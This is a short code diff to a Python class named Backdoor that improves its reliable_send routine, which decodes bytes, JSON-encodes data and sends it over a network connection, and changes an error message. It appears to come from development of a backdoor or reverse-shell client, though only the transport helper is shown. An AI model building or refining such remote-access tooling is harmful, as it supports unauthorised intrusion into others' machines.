@@ -11,10 +11,13 @@ class Backdoor:
 
     def reliable_send(self, data):
         try:
-            json_data = json.dumps(data.decode() if isinstance(data, bytes) else data)
+            # Convert bytes to string if needed
+            if isinstance(data, bytes):
+                data = data.decode('utf-8', errors='replace')
+            json_data = json.dumps(data)
             self.connection.send(json_data.encode())
         except Exception as e:
-            print(f"Error in reliable_send: {e}")
+            print(f"[!] Error in reliable_send: {e}")
 
     def reliable_receive(self):
         json_data = ""
